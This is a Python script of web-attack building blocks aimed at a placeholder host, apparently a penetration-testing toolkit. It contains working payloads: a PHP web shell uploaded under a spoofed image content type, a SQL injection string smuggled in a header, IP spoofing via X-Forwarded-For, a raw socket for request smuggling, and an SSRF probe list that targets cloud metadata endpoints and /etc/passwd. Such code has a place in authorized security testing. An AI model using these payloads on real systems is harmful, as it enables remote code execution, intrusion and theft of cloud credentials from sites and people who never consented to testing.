#!/usr/bin/env python3
"""HTTP request building blocks: GET/POST (form, JSON, multipart), custom
headers, a raw-socket request (useful for CRLF/request smuggling), and an
SSRF probe against common internal/metadata endpoints."""

import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"
SESSION = requests.Session()


def get_example():
    """Simple authenticated GET with query parameters."""
    params = {"id": "1"}
    r = SESSION.get(f"{BASE_URL}/product", params=params, verify=False, timeout=10)
    print(r.status_code, len(r.text))
    return r


def post_form_example():
    """POST with url-encoded form data (classic login)."""
    data = {"username": "admin", "password": "admin"}
    r = SESSION.post(f"{BASE_URL}/login", data=data, verify=False, timeout=10)
    print(r.status_code, len(r.text))
    return r


def post_json_example():
    """POST a JSON body (REST APIs, modern apps)."""
    payload = {"id": 1, "comment": "test"}
    headers = {"Content-Type": "application/json"}
    r = SESSION.post(f"{BASE_URL}/api/comments", json=payload, headers=headers,
                     verify=False, timeout=10)
    print(r.status_code, r.text[:200])
    return r


def post_multipart_example():
    """Multipart file upload with a spoofed image content-type (upload-to-RCE test)."""
    files = {"file": ("shell.php", b"<?php system($_GET['c']); ?>", "image/jpeg")}
    r = SESSION.post(f"{BASE_URL}/upload", files=files, verify=False, timeout=10)
    print(r.status_code, r.text[:200])
    return r


def custom_headers_example():
    """Inject payloads through headers (SQLi/SSRF/IP spoofing surface)."""
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "User-Agent": "Mozilla/5.0",
        "X-Custom-Header": "1' OR '1'='1",
    }
    r = SESSION.get(f"{BASE_URL}/", headers=headers, verify=False, timeout=10)
    return r


def raw_socket_request_example():
    """Send a hand-crafted request over a raw TLS socket. Bypasses the
    normalization done by requests, so it is handy for CRLF injection,
    request smuggling, and malformed-request testing."""
    import socket
    import ssl

    host, port = "target.local", 443
    raw = (
        "GET /product?id=1 HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: custom\r\n"
        "Connection: close\r\n"
        "\r\n"
    )

    ctx = ssl._create_unverified_context()
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw.encode())
            response = b""
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response += chunk
    print(response.decode(errors="replace")[:500])
    return response


def ssrf_probe_example():
    """Feed internal/metadata URLs to a server-side fetch feature and compare
    responses to spot SSRF. GCP metadata also needs a 'Metadata-Flavor: Google'
    header, sent here to cover that case."""
    targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/metadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1:22",
        "http://127.0.0.1:80/admin",
        "file:///etc/passwd",
    ]
    for target in targets:
        data = {"url": target}
        headers = {"Metadata-Flavor": "Google"}
        r = SESSION.post(f"{BASE_URL}/api/fetch-preview", json=data, headers=headers,
                         verify=False, timeout=10)
        print(f"[{target}] -> {r.status_code} len={len(r.text)}")


if __name__ == "__main__":
    pass
